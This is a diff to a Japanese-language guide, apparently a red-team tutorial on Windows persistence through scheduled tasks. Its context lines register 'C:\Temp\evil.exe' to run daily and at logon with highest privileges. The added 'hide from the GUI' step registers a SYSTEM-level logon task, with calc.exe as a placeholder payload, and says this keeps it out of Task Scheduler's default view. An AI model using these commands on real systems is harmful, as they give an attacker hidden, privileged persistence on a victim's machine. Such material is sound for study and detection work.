@@ -17,3 +17,9 @@ schtasks /create /tn "EveryDayRun" /tr "C:\Temp\evil.exe" /sc daily /st 12:00 /r
 # ログオン時実行の登録
 schtasks /create /tn "LogonRun" /tr "C:\Temp\evil.exe" /sc onlogon /rl highest
 ```
+## Step2 GUIから隠す
+タスクスケジューラのGUI(taskschd.msc)のデフォルト設定では見えないように登録する。
+```powershell
+# SYSTEM権限で、かつバックグラウンド設定(/itなし)で登録
+schtasks /create /tn "HiddenTask" /tr "C:\Windows\System32\calc.exe" /sc onlogon /ru "SYSTEM" /rl highest
+```
